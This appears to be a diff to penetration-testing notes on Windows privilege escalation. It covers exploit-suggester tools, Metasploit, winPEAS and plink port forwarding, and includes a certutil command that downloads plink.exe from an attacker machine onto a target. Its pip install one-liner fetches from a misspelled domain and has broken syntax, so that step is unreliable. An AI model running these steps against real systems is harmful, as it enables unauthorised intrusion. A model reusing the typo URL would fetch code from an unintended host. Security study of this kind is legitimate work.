@@ -61,13 +61,13 @@
 
 #### Exploring Autommated Tools
 ##### windows-exploit-suggerster.py : Steps to follow with windows-exploit-suggester.py
-* 1. install: if regular pip install from repo causes problem, here's a one liner (windows-exploit-suggester.py): `curl https://bootsrtap.pypa.io//get-pyp.py -o get pip.py: python get-pip.py`
+* 1. install: if regular pip install from repo causes problem, here's a one liner (windows-exploit-suggester.py): `curl https://bootsrtap.pypa.io/get-pyp.py -o get pip.py: python get-pip.py`
 * 2. create database: `./windows-exploit-suggester.py --update`
 * 3. run `systeminfo` on the target Windows machine and save it into a systeminfo.txt file.
 * 4. finally: `./windows-exploit-suggester.py --database 2020-04-17-mssb.xls --systeminfo systeminfo.txt` systeminfo.txt is your previously saved file.
 
 ##### Metasploit
-* in metasploit use `run post/multi//recon/local_exploit_suggester`
+* in metasploit use `run post/multi/recon/local_exploit_suggester`
 
 ##### Metasploit and winPEAS
 * on target machine from metasploit meterpreter shell:
@@ -93,7 +93,7 @@
 
 #### Using plink.exe
 
-* **Bring file over to target machine in Windows:** `certutil --urlcache -f http://<attack machine's IP>/plink.exe`
+* **Bring file over to target machine in Windows:** `certutil -urlcache -f http://<attack machine's IP>/plink.exe`
 * find a folder with wright priv. /tmp is good
 * use plink for port forwarding 
 
